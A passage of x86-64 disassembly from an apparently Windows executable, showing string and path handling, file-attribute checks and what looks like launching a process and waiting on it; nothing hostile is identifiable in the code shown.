   2dc4916bb:	41 b8 00 02 00 00    	mov    $0x200,%r8d
   2dc4916c1:	48 89 f9             	mov    %rdi,%rcx
   2dc4916c4:	48 8d 9c 24 a0 02 00 	lea    0x2a0(%rsp),%rbx
   2dc4916cb:	00 
   2dc4916cc:	e8 a7 37 01 00       	call   0x2dc4a4e78
   2dc4916d1:	49 89 f8             	mov    %rdi,%r8
   2dc4916d4:	48 89 d9             	mov    %rbx,%rcx
   2dc4916d7:	48 8d 15 72 69 02 00 	lea    0x26972(%rip),%rdx        # 0x2dc4b8050
   2dc4916de:	e8 7d ff ff ff       	call   0x2dc491660
   2dc4916e3:	48 8d 7c 24 38       	lea    0x38(%rsp),%rdi
   2dc4916e8:	31 c0                	xor    %eax,%eax
   2dc4916ea:	b9 0d 00 00 00       	mov    $0xd,%ecx
   2dc4916ef:	f3 48 ab             	rep stos %rax,(%rdi)
   2dc4916f2:	48 8b 05 0f 6b 02 00 	mov    0x26b0f(%rip),%rax        # 0x2dc4b8208
   2dc4916f9:	48 8d 3d a0 69 02 00 	lea    0x269a0(%rip),%rdi        # 0x2dc4b80a0
   2dc491700:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   2dc491705:	66 48 0f 6e c7       	movq   %rdi,%xmm0
   2dc49170a:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   2dc49170f:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   2dc491714:	48 8d 05 8a 69 02 00 	lea    0x2698a(%rip),%rax        # 0x2dc4b80a5
   2dc49171b:	66 48 0f 6e c8       	movq   %rax,%xmm1
   2dc491720:	66 0f 6c c1          	punpcklqdq %xmm1,%xmm0
   2dc491724:	0f 29 44 24 40       	movaps %xmm0,0x40(%rsp)
   2dc491729:	ff 15 09 51 03 00    	call   *0x35109(%rip)        # 0x2dc4c6838
   2dc49172f:	85 c0                	test   %eax,%eax
   2dc491731:	0f 84 6e ff ff ff    	je     0x2dc4916a5
   2dc491737:	48 8b 8c 24 98 00 00 	mov    0x98(%rsp),%rcx
   2dc49173e:	00 
   2dc49173f:	ba 30 75 00 00       	mov    $0x7530,%edx
   2dc491744:	ff 15 7e 4e 03 00    	call   *0x34e7e(%rip)        # 0x2dc4c65c8
   2dc49174a:	48 8b 8c 24 98 00 00 	mov    0x98(%rsp),%rcx
   2dc491751:	00 
   2dc491752:	48 8d 54 24 2c       	lea    0x2c(%rsp),%rdx
   2dc491757:	c7 44 24 2c 00 00 00 	movl   $0x0,0x2c(%rsp)
   2dc49175e:	00 
   2dc49175f:	ff 15 c3 4d 03 00    	call   *0x34dc3(%rip)        # 0x2dc4c6528
   2dc491765:	48 8b 8c 24 98 00 00 	mov    0x98(%rsp),%rcx
   2dc49176c:	00 
   2dc49176d:	ff 15 6d 4d 03 00    	call   *0x34d6d(%rip)        # 0x2dc4c64e0
   2dc491773:	90                   	nop
   2dc491774:	48 81 c4 a8 0a 00 00 	add    $0xaa8,%rsp
   2dc49177b:	5b                   	pop    %rbx
   2dc49177c:	5f                   	pop    %rdi
   2dc49177d:	c3                   	ret
   2dc49177e:	66 90                	xchg   %ax,%ax
   2dc491780:	55                   	push   %rbp
   2dc491781:	57                   	push   %rdi
   2dc491782:	56                   	push   %rsi
   2dc491783:	53                   	push   %rbx
   2dc491784:	48 83 ec 38          	sub    $0x38,%rsp
   2dc491788:	4c 89 c6             	mov    %r8,%rsi
   2dc49178b:	48 89 cb             	mov    %rcx,%rbx
   2dc49178e:	48 89 d7             	mov    %rdx,%rdi
   2dc491791:	48 29 d6             	sub    %rdx,%rsi
   2dc491794:	48 89 f5             	mov    %rsi,%rbp
   2dc491797:	48 d1 fd             	sar    $1,%rbp
   2dc49179a:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   2dc49179f:	48 89 e8             	mov    %rbp,%rax
   2dc4917a2:	48 83 fe 0e          	cmp    $0xe,%rsi
   2dc4917a6:	77 18                	ja     0x2dc4917c0
   2dc4917a8:	48 8b 09             	mov    (%rcx),%rcx
   2dc4917ab:	48 83 fd 01          	cmp    $0x1,%rbp
   2dc4917af:	75 2b                	jne    0x2dc4917dc
   2dc4917b1:	0f b7 12             	movzwl (%rdx),%edx
   2dc4917b4:	66 89 11             	mov    %dx,(%rcx)
   2dc4917b7:	ba 02 00 00 00       	mov    $0x2,%edx
   2dc4917bc:	eb 2f                	jmp    0x2dc4917ed
   2dc4917be:	66 90                	xchg   %ax,%ax
   2dc4917c0:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   2dc4917c5:	45 31 c0             	xor    %r8d,%r8d
   2dc4917c8:	e8 23 21 02 00       	call   0x2dc4b38f0
   2dc4917cd:	48 89 03             	mov    %rax,(%rbx)
   2dc4917d0:	48 89 c1             	mov    %rax,%rcx
   2dc4917d3:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   2dc4917d8:	48 89 43 10          	mov    %rax,0x10(%rbx)
   2dc4917dc:	48 85 ed             	test   %rbp,%rbp
   2dc4917df:	75 1f                	jne    0x2dc491800
   2dc4917e1:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   2dc4917e6:	48 8b 0b             	mov    (%rbx),%rcx
   2dc4917e9:	48 8d 14 00          	lea    (%rax,%rax,1),%rdx
   2dc4917ed:	48 89 43 08          	mov    %rax,0x8(%rbx)
   2dc4917f1:	31 c0                	xor    %eax,%eax
   2dc4917f3:	66 89 04 11          	mov    %ax,(%rcx,%rdx,1)
   2dc4917f7:	48 83 c4 38          	add    $0x38,%rsp
   2dc4917fb:	5b                   	pop    %rbx
   2dc4917fc:	5e                   	pop    %rsi
   2dc4917fd:	5f                   	pop    %rdi
   2dc4917fe:	5d                   	pop    %rbp
   2dc4917ff:	c3                   	ret
   2dc491800:	49 89 f0             	mov    %rsi,%r8
   2dc491803:	48 89 fa             	mov    %rdi,%rdx
   2dc491806:	e8 d5 35 01 00       	call   0x2dc4a4de0
   2dc49180b:	eb d4                	jmp    0x2dc4917e1
   2dc49180d:	0f 1f 00             	nopl   (%rax)
   2dc491810:	57                   	push   %rdi
   2dc491811:	56                   	push   %rsi
   2dc491812:	53                   	push   %rbx
   2dc491813:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   2dc49181a:	48 89 cb             	mov    %rcx,%rbx
   2dc49181d:	48 8b 09             	mov    (%rcx),%rcx
   2dc491820:	48 89 d6             	mov    %rdx,%rsi
   2dc491823:	48 85 c9             	test   %rcx,%rcx
   2dc491826:	74 63                	je     0x2dc49188b
   2dc491828:	ff 15 02 4d 03 00    	call   *0x34d02(%rip)        # 0x2dc4c6530
   2dc49182e:	83 f8 ff             	cmp    $0xffffffff,%eax
   2dc491831:	74 58                	je     0x2dc49188b
   2dc491833:	a8 10                	test   $0x10,%al
   2dc491835:	75 54                	jne    0x2dc49188b
   2dc491837:	31 c0                	xor    %eax,%eax
   2dc491839:	48 8d 7c 24 28       	lea    0x28(%rsp),%rdi
   2dc49183e:	b9 0d 00 00 00       	mov    $0xd,%ecx
   2dc491843:	4c 8b 03             	mov    (%rbx),%r8
   2dc491846:	f3 48 ab             	rep stos %rax,(%rdi)
   2dc491849:	48 8b 16             	mov    (%rsi),%rdx
   2dc49184c:	48 8b 05 b5 69 02 00 	mov    0x269b5(%rip),%rax        # 0x2dc4b8208
   2dc491853:	c7 44 24 50 01 00 00 	movl   $0x1,0x50(%rsp)
   2dc49185a:	00 
   2dc49185b:	4c 89 44 24 38       	mov    %r8,0x38(%rsp)
   2dc491860:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   2dc491865:	48 89 54 24 48       	mov    %rdx,0x48(%rsp)
   2dc49186a:	e8 31 fd ff ff       	call   0x2dc4915a0
   2dc49186f:	84 c0                	test   %al,%al
   2dc491871:	74 0c                	je     0x2dc49187f
   2dc491873:	48 8d 05 3a 68 02 00 	lea    0x2683a(%rip),%rax        # 0x2dc4b80b4
   2dc49187a:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   2dc49187f:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   2dc491884:	ff 15 b6 4f 03 00    	call   *0x34fb6(%rip)        # 0x2dc4c6840
   2dc49188a:	90                   	nop
   2dc49188b:	48 81 c4 90 00 00 00 	add    $0x90,%rsp
   2dc491892:	5b                   	pop    %rbx
   2dc491893:	5e                   	pop    %rsi
   2dc491894:	5f                   	pop    %rdi
   2dc491895:	c3                   	ret
   2dc491896:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   2dc49189d:	00 00 00 
   2dc4918a0:	41 55                	push   %r13
   2dc4918a2:	41 54                	push   %r12
   2dc4918a4:	55                   	push   %rbp
   2dc4918a5:	57                   	push   %rdi
   2dc4918a6:	56                   	push   %rsi
   2dc4918a7:	53                   	push   %rbx
   2dc4918a8:	48 83 ec 48          	sub    $0x48,%rsp
   2dc4918ac:	48 8b 72 08          	mov    0x8(%rdx),%rsi
   2dc4918b0:	48 01 f6             	add    %rsi,%rsi
   2dc4918b3:	48 89 f5             	mov    %rsi,%rbp
   2dc4918b6:	4c 8d 61 10          	lea    0x10(%rcx),%r12
   2dc4918ba:	48 d1 fd             	sar    $1,%rbp
   2dc4918bd:	48 89 cb             	mov    %rcx,%rbx
   2dc4918c0:	4c 89 c7             	mov    %r8,%rdi
   2dc4918c3:	4c 89 21             	mov    %r12,(%rcx)
   2dc4918c6:	4c 8b 2a             	mov    (%rdx),%r13
   2dc4918c9:	48 89 6c 24 38       	mov    %rbp,0x38(%rsp)
   2dc4918ce:	48 83 fe 0e          	cmp    $0xe,%rsi
   2dc4918d2:	0f 87 88 00 00 00    	ja     0x2dc491960
   2dc4918d8:	48 83 fd 01          	cmp    $0x1,%rbp
   2dc4918dc:	75 62                	jne    0x2dc491940
   2dc4918de:	41 0f b7 45 00       	movzwl 0x0(%r13),%eax
   2dc4918e3:	45 31 c9             	xor    %r9d,%r9d
   2dc4918e6:	48 c7 41 08 01 00 00 	movq   $0x1,0x8(%rcx)
   2dc4918ed:	00 
   2dc4918ee:	66 44 89 49 12       	mov    %r9w,0x12(%rcx)
   2dc4918f3:	66 89 41 10          	mov    %ax,0x10(%rcx)
   2dc4918f7:	66 83 f8 5c          	cmp    $0x5c,%ax
   2dc4918fb:	0f 85 0f 01 00 00    	jne    0x2dc491a10
   2dc491901:	48 89 f9             	mov    %rdi,%rcx
   2dc491904:	e8 ef 33 01 00       	call   0x2dc4a4cf8
   2dc491909:	49 89 c0             	mov    %rax,%r8
   2dc49190c:	48 b8 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rax
   2dc491913:	ff ff 1f 
   2dc491916:	48 2b 43 08          	sub    0x8(%rbx),%rax
   2dc49191a:	4c 39 c0             	cmp    %r8,%rax
   2dc49191d:	0f 82 f9 00 00 00    	jb     0x2dc491a1c
   2dc491923:	48 89 fa             	mov    %rdi,%rdx
   2dc491926:	48 89 d9             	mov    %rbx,%rcx
   2dc491929:	e8 72 1e 02 00       	call   0x2dc4b37a0
   2dc49192e:	48 89 d8             	mov    %rbx,%rax
   2dc491931:	48 83 c4 48          	add    $0x48,%rsp
   2dc491935:	5b                   	pop    %rbx
   2dc491936:	5e                   	pop    %rsi
   2dc491937:	5f                   	pop    %rdi
   2dc491938:	5d                   	pop    %rbp
   2dc491939:	41 5c                	pop    %r12
   2dc49193b:	41 5d                	pop    %r13
   2dc49193d:	c3                   	ret
   2dc49193e:	66 90                	xchg   %ax,%ax
   2dc491940:	4c 89 e1             	mov    %r12,%rcx
   2dc491943:	48 85 ed             	test   %rbp,%rbp
   2dc491946:	75 39                	jne    0x2dc491981
   2dc491948:	31 c0                	xor    %eax,%eax
   2dc49194a:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
   2dc491951:	00 
   2dc491952:	66 89 43 10          	mov    %ax,0x10(%rbx)
   2dc491956:	eb a9                	jmp    0x2dc491901
   2dc491958:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   2dc49195f:	00 
   2dc491960:	48 8d 54 24 38       	lea    0x38(%rsp),%rdx
   2dc491965:	45 31 c0             	xor    %r8d,%r8d
   2dc491968:	e8 83 1f 02 00       	call   0x2dc4b38f0
   2dc49196d:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   2dc491972:	48 89 03             	mov    %rax,(%rbx)
   2dc491975:	48 89 c1             	mov    %rax,%rcx
   2dc491978:	48 89 53 10          	mov    %rdx,0x10(%rbx)
   2dc49197c:	48 85 ed             	test   %rbp,%rbp
   2dc49197f:	74 13                	je     0x2dc491994
   2dc491981:	4c 89 ea             	mov    %r13,%rdx
   2dc491984:	49 89 f0             	mov    %rsi,%r8
   2dc491987:	e8 54 34 01 00       	call   0x2dc4a4de0
   2dc49198c:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   2dc491991:	48 8b 0b             	mov    (%rbx),%rcx
   2dc491994:	45 31 c0             	xor    %r8d,%r8d
   2dc491997:	48 89 53 08          	mov    %rdx,0x8(%rbx)
   2dc49199b:	48 8d 2c 12          	lea    (%rdx,%rdx,1),%rbp
   2dc49199f:	66 44 89 04 51       	mov    %r8w,(%rcx,%rdx,2)
   2dc4919a4:	48 85 d2             	test   %rdx,%rdx
   2dc4919a7:	0f 84 54 ff ff ff    	je     0x2dc491901
   2dc4919ad:	66 83 7c 51 fe 5c    	cmpw   $0x5c,-0x2(%rcx,%rdx,2)
   2dc4919b3:	0f 84 48 ff ff ff    	je     0x2dc491901
   2dc4919b9:	48 8d 72 01          	lea    0x1(%rdx),%rsi
   2dc4919bd:	49 39 cc             	cmp    %rcx,%r12
   2dc4919c0:	74 66                	je     0x2dc491a28
   2dc4919c2:	48 8b 43 10          	mov    0x10(%rbx),%rax
   2dc4919c6:	48 39 f0             	cmp    %rsi,%rax
   2dc4919c9:	72 25                	jb     0x2dc4919f0
   2dc4919cb:	48 8b 03             	mov    (%rbx),%rax
   2dc4919ce:	ba 5c 00 00 00       	mov    $0x5c,%edx
   2dc4919d3:	31 c9                	xor    %ecx,%ecx
   2dc4919d5:	66 89 14 28          	mov    %dx,(%rax,%rbp,1)
   2dc4919d9:	48 89 73 08          	mov    %rsi,0x8(%rbx)
   2dc4919dd:	66 89 0c 70          	mov    %cx,(%rax,%rsi,2)
   2dc4919e1:	e9 1b ff ff ff       	jmp    0x2dc491901
   2dc4919e6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   2dc4919ed:	00 00 00 
   2dc4919f0:	48 c7 44 24 20 01 00 	movq   $0x1,0x20(%rsp)
   2dc4919f7:	00 00 
   2dc4919f9:	45 31 c9             	xor    %r9d,%r9d
   2dc4919fc:	45 31 c0             	xor    %r8d,%r8d
   2dc4919ff:	48 89 d9             	mov    %rbx,%rcx
   2dc491a02:	e8 69 1f 02 00       	call   0x2dc4b3970
   2dc491a07:	eb c2                	jmp    0x2dc4919cb
   2dc491a09:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   2dc491a10:	be 02 00 00 00       	mov    $0x2,%esi
   2dc491a15:	bd 02 00 00 00       	mov    $0x2,%ebp
   2dc491a1a:	eb af                	jmp    0x2dc4919cb
   2dc491a1c:	48 8d 0d 9d 66 02 00 	lea    0x2669d(%rip),%rcx        # 0x2dc4b80c0
   2dc491a23:	e8 88 4d 02 00       	call   0x2dc4b67b0
   2dc491a28:	b8 07 00 00 00       	mov    $0x7,%eax
   2dc491a2d:	eb 97                	jmp    0x2dc4919c6
   2dc491a2f:	48 89 c6             	mov    %rax,%rsi
   2dc491a32:	e9 29 47 02 00       	jmp    0x2dc4b6160
   2dc491a37:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   2dc491a3e:	00 00 
   2dc491a40:	41 54                	push   %r12
   2dc491a42:	55                   	push   %rbp
   2dc491a43:	57                   	push   %rdi
   2dc491a44:	56                   	push   %rsi
   2dc491a45:	53                   	push   %rbx
   2dc491a46:	48 81 ec 60 02 00 00 	sub    $0x260,%rsp
   2dc491a4d:	45 31 c9             	xor    %r9d,%r9d
   2dc491a50:	45 31 c0             	xor    %r8d,%r8d
   2dc491a53:	ba 23 00 00 00       	mov    $0x23,%edx
   2dc491a58:	48 8d 7c 24 50       	lea    0x50(%rsp),%rdi
   2dc491a5d:	48 89 cb             	mov    %rcx,%rbx
   2dc491a60:	31 c9                	xor    %ecx,%ecx
   2dc491a62:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   2dc491a67:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   2dc491a6c:	48 8d 74 24 40       	lea    0x40(%rsp),%rsi
   2dc491a71:	ff 15 b9 4d 03 00    	call   *0x34db9(%rip)        # 0x2dc4c6830
   2dc491a77:	4c 8b 25 6a 4a 03 00 	mov    0x34a6a(%rip),%r12        # 0x2dc4c64e8
   2dc491a7e:	85 c0                	test   %eax,%eax
   2dc491a80:	0f 88 c6 00 00 00    	js     0x2dc491b4c
   2dc491a86:	48 89 f9             	mov    %rdi,%rcx
   2dc491a89:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   2dc491a8e:	e8 65 32 01 00       	call   0x2dc4a4cf8
   2dc491a93:	48 89 fa             	mov    %rdi,%rdx
   2dc491a96:	48 89 e9             	mov    %rbp,%rcx
   2dc491a99:	4c 8d 04 47          	lea    (%rdi,%rax,2),%r8
   2dc491a9d:	48 8d 3d 32 66 02 00 	lea    0x26632(%rip),%rdi        # 0x2dc4b80d6
   2dc491aa4:	e8 d7 fc ff ff       	call   0x2dc491780
   2dc491aa9:	48 89 f9             	mov    %rdi,%rcx
   2dc491aac:	e8 47 32 01 00       	call   0x2dc4a4cf8
   2dc491ab1:	49 89 c0             	mov    %rax,%r8
   2dc491ab4:	48 b8 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rax
   2dc491abb:	ff ff 1f 
   2dc491abe:	48 2b 44 24 38       	sub    0x38(%rsp),%rax
   2dc491ac3:	4c 39 c0             	cmp    %r8,%rax
   2dc491ac6:	0f 82 d1 01 00 00    	jb     0x2dc491c9d
   2dc491acc:	48 89 fa             	mov    %rdi,%rdx
   2dc491acf:	48 89 e9             	mov    %rbp,%rcx
   2dc491ad2:	e8 c9 1c 02 00       	call   0x2dc4b37a0
   2dc491ad7:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   2dc491adc:	4c 8b 25 05 4a 03 00 	mov    0x34a05(%rip),%r12        # 0x2dc4c64e8
   2dc491ae3:	31 d2                	xor    %edx,%edx
   2dc491ae5:	41 ff d4             	call   *%r12
   2dc491ae8:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   2dc491aed:	ff 15 3d 4a 03 00    	call   *0x34a3d(%rip)        # 0x2dc4c6530
   2dc491af3:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   2dc491af8:	83 f8 ff             	cmp    $0xffffffff,%eax
   2dc491afb:	74 3b                	je     0x2dc491b38
   2dc491afd:	48 8d 43 10          	lea    0x10(%rbx),%rax
   2dc491b01:	48 8b 7c 24 38       	mov    0x38(%rsp),%rdi
   2dc491b06:	48 89 03             	mov    %rax,(%rbx)
   2dc491b09:	48 39 f1             	cmp    %rsi,%rcx
   2dc491b0c:	0f 84 76 01 00 00    	je     0x2dc491c88
   2dc491b12:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   2dc491b17:	48 89 0b             	mov    %rcx,(%rbx)
   2dc491b1a:	48 89 43 10          	mov    %rax,0x10(%rbx)
   2dc491b1e:	48 89 7b 08          	mov    %rdi,0x8(%rbx)
   2dc491b22:	48 89 d8             	mov    %rbx,%rax
   2dc491b25:	48 81 c4 60 02 00 00 	add    $0x260,%rsp
   2dc491b2c:	5b                   	pop    %rbx
   2dc491b2d:	5e                   	pop    %rsi
   2dc491b2e:	5f                   	pop    %rdi
   2dc491b2f:	5d                   	pop    %rbp
   2dc491b30:	41 5c                	pop    %r12
   2dc491b32:	c3                   	ret
   2dc491b33:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   2dc491b38:	48 39 f1             	cmp    %rsi,%rcx
   2dc491b3b:	74 0f                	je     0x2dc491b4c
   2dc491b3d:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   2dc491b42:	48 8d 54 00 02       	lea    0x2(%rax,%rax,1),%rdx
   2dc491b47:	e8 34 41 02 00       	call   0x2dc4b5c80
   2dc491b4c:	48 8d 3d 8f 65 02 00 	lea    0x2658f(%rip),%rdi        # 0x2dc4b80e2
   2dc491b53:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   2dc491b58:	48 89 f9             	mov    %rdi,%rcx
   2dc491b5b:	e8 98 31 01 00       	call   0x2dc4a4cf8
   2dc491b60:	48 89 fa             	mov    %rdi,%rdx
   2dc491b63:	48 89 e9             	mov    %rbp,%rcx
   2dc491b66:	4c 8d 04 47          	lea    (%rdi,%rax,2),%r8
   2dc491b6a:	e8 11 fc ff ff       	call   0x2dc491780
   2dc491b6f:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   2dc491b74:	31 d2                	xor    %edx,%edx
   2dc491b76:	41 ff d4             	call   *%r12
   2dc491b79:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   2dc491b7e:	ff 15 ac 49 03 00    	call   *0x349ac(%rip)        # 0x2dc4c6530
   2dc491b84:	83 f8 ff             	cmp    $0xffffffff,%eax
   2dc491b87:	75 73                	jne    0x2dc491bfc
   2dc491b89:	66 83 3d 0f 25 03 00 	cmpw   $0x0,0x3250f(%rip)        # 0x2dc4c40a0
   2dc491b90:	00 
   2dc491b91:	48 8d 3d 08 25 03 00 	lea    0x32508(%rip),%rdi        # 0x2dc4c40a0
   2dc491b98:	0f 84 8a 00 00 00    	je     0x2dc491c28
   2dc491b9e:	48 89 f9             	mov    %rdi,%rcx
   2dc491ba1:	e8 52 31 01 00       	call   0x2dc4a4cf8
   2dc491ba6:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
   2dc491bab:	49 89 f9             	mov    %rdi,%r9
   2dc491bae:	31 d2                	xor    %edx,%edx
   2dc491bb0:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   2dc491bb5:	48 89 e9             	mov    %rbp,%rcx
   2dc491bb8:	e8 d3 fb 01 00       	call   0x2dc4b1790
   2dc491bbd:	48 8d 3d 2e 65 02 00 	lea    0x2652e(%rip),%rdi        # 0x2dc4b80f2
   2dc491bc4:	48 89 f9             	mov    %rdi,%rcx
   2dc491bc7:	e8 2c 31 01 00       	call   0x2dc4a4cf8
   2dc491bcc:	49 89 c0             	mov    %rax,%r8
   2dc491bcf:	48 b8 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rax
   2dc491bd6:	ff ff 1f 
   2dc491bd9:	48 2b 44 24 38       	sub    0x38(%rsp),%rax
   2dc491bde:	4c 39 c0             	cmp    %r8,%rax
   2dc491be1:	0f 82 c2 00 00 00    	jb     0x2dc491ca9
   2dc491be7:	48 89 fa             	mov    %rdi,%rdx
   2dc491bea:	48 89 e9             	mov    %rbp,%rcx
   2dc491bed:	e8 ae 1b 02 00       	call   0x2dc4b37a0
   2dc491bf2:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   2dc491bf7:	31 d2                	xor    %edx,%edx
   2dc491bf9:	41 ff d4             	call   *%r12
   2dc491bfc:	48 8d 4b 10          	lea    0x10(%rbx),%rcx
   2dc491c00:	48 8b 7c 24 38       	mov    0x38(%rsp),%rdi
   2dc491c05:	48 89 0b             	mov    %rcx,(%rbx)
   2dc491c08:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   2dc491c0d:	48 39 f0             	cmp    %rsi,%rax
   2dc491c10:	74 5e                	je     0x2dc491c70
   2dc491c12:	48 89 03             	mov    %rax,(%rbx)
   2dc491c15:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   2dc491c1a:	48 89 43 10          	mov    %rax,0x10(%rbx)
   2dc491c1e:	e9 fb fe ff ff       	jmp    0x2dc491b1e
   2dc491c23:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   2dc491c28:	48 8d 43 10          	lea    0x10(%rbx),%rax
   2dc491c2c:	48 8d 3d cd 64 02 00 	lea    0x264cd(%rip),%rdi        # 0x2dc4b8100
   2dc491c33:	48 89 03             	mov    %rax,(%rbx)
   2dc491c36:	48 89 f9             	mov    %rdi,%rcx
   2dc491c39:	e8 ba 30 01 00       	call   0x2dc4a4cf8
   2dc491c3e:	48 89 fa             	mov    %rdi,%rdx
   2dc491c41:	48 89 d9             	mov    %rbx,%rcx
   2dc491c44:	4c 8d 04 47          	lea    (%rdi,%rax,2),%r8
   2dc491c48:	e8 33 fb ff ff       	call   0x2dc491780
   2dc491c4d:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   2dc491c52:	48 39 f1             	cmp    %rsi,%rcx
   2dc491c55:	0f 84 c7 fe ff ff    	je     0x2dc491b22
   2dc491c5b:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   2dc491c60:	48 8d 54 00 02       	lea    0x2(%rax,%rax,1),%rdx
   2dc491c65:	e8 16 40 02 00       	call   0x2dc4b5c80
   2dc491c6a:	e9 b3 fe ff ff       	jmp    0x2dc491b22
   2dc491c6f:	90                   	nop
   2dc491c70:	4c 8d 44 3f 02       	lea    0x2(%rdi,%rdi,1),%r8
   2dc491c75:	48 89 f2             	mov    %rsi,%rdx
   2dc491c78:	e8 63 31 01 00       	call   0x2dc4a4de0
   2dc491c7d:	e9 9c fe ff ff       	jmp    0x2dc491b1e
   2dc491c82:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   2dc491c88:	4c 8d 44 3f 02       	lea    0x2(%rdi,%rdi,1),%r8
   2dc491c8d:	48 89 f2             	mov    %rsi,%rdx
   2dc491c90:	48 89 c1             	mov    %rax,%rcx
   2dc491c93:	e8 48 31 01 00       	call   0x2dc4a4de0
   2dc491c98:	e9 81 fe ff ff       	jmp    0x2dc491b1e
   2dc491c9d:	48 8d 0d 1c 64 02 00 	lea    0x2641c(%rip),%rcx        # 0x2dc4b80c0
   2dc491ca4:	e8 07 4b 02 00       	call   0x2dc4b67b0
   2dc491ca9:	48 8d 0d 10 64 02 00 	lea    0x26410(%rip),%rcx        # 0x2dc4b80c0
   2dc491cb0:	e8 fb 4a 02 00       	call   0x2dc4b67b0
   2dc491cb5:	48 89 c3             	mov    %rax,%rbx
   2dc491cb8:	e9 b4 44 02 00       	jmp    0x2dc4b6171
   2dc491cbd:	48 89 c3             	mov    %rax,%rbx
   2dc491cc0:	e9 bc 44 02 00       	jmp    0x2dc4b6181
   2dc491cc5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   2dc491ccc:	00 00 00 00 
   2dc491cd0:	41 57                	push   %r15
   2dc491cd2:	41 56                	push   %r14
   2dc491cd4:	41 55                	push   %r13
   2dc491cd6:	41 54                	push   %r12
   2dc491cd8:	55                   	push   %rbp
   2dc491cd9:	57                   	push   %rdi
   2dc491cda:	56                   	push   %rsi
   2dc491cdb:	53                   	push   %rbx
   2dc491cdc:	48 81 ec 78 03 00 00 	sub    $0x378,%rsp
   2dc491ce3:	e8 b8 f8 ff ff       	call   0x2dc4915a0
   2dc491ce8:	84 c0                	test   %al,%al
   2dc491cea:	0f 84 20 03 00 00    	je     0x2dc492010
   2dc491cf0:	48 8d 1d a9 23 03 00 	lea    0x323a9(%rip),%rbx        # 0x2dc4c40a0
   2dc491cf7:	48 8d 84 24 10 01 00 	lea    0x110(%rsp),%rax
   2dc491cfe:	00 
   2dc491cff:	48 89 d9             	mov    %rbx,%rcx
   2dc491d02:	4c 8d bc 24 20 01 00 	lea    0x120(%rsp),%r15
   2dc491d09:	00 
   2dc491d0a:	48 89 c6             	mov    %rax,%rsi
   2dc491d0d:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   2dc491d12:	4c 89 bc 24 10 01 00 	mov    %r15,0x110(%rsp)
   2dc491d19:	00 
   2dc491d1a:	48 8d 3d 2f 64 02 00 	lea    0x2642f(%rip),%rdi        # 0x2dc4b8150
   2dc491d21:	4c 8d a4 24 90 02 00 	lea    0x290(%rsp),%r12
   2dc491d28:	00 
   2dc491d29:	e8 ca 2f 01 00       	call   0x2dc4a4cf8
   2dc491d2e:	48 89 da             	mov    %rbx,%rdx
   2dc491d31:	48 89 f1             	mov    %rsi,%rcx
   2dc491d34:	48 8d b4 24 a0 02 00 	lea    0x2a0(%rsp),%rsi
   2dc491d3b:	00 
   2dc491d3c:	4c 8d 04 43          	lea    (%rbx,%rax,2),%r8
   2dc491d40:	e8 3b fa ff ff       	call   0x2dc491780
   2dc491d45:	48 89 f9             	mov    %rdi,%rcx
   2dc491d48:	48 89 b4 24 90 02 00 	mov    %rsi,0x290(%rsp)
   2dc491d4f:	00 
   2dc491d50:	e8 a3 2f 01 00       	call   0x2dc4a4cf8
   2dc491d55:	48 89 fa             	mov    %rdi,%rdx
   2dc491d58:	4c 89 e1             	mov    %r12,%rcx
   2dc491d5b:	4c 8d 04 47          	lea    (%rdi,%rax,2),%r8
   2dc491d5f:	e8 1c fa ff ff       	call   0x2dc491780
   2dc491d64:	48 8d 0d f7 63 02 00 	lea    0x263f7(%rip),%rcx        # 0x2dc4b8162
   2dc491d6b:	e8 88 2f 01 00       	call   0x2dc4a4cf8
   2dc491d70:	45 31 c0             	xor    %r8d,%r8d
   2dc491d73:	31 d2                	xor    %edx,%edx
   2dc491d75:	4c 89 e1             	mov    %r12,%rcx
   2dc491d78:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   2dc491d7d:	4c 8d 0d de 63 02 00 	lea    0x263de(%rip),%r9        # 0x2dc4b8162
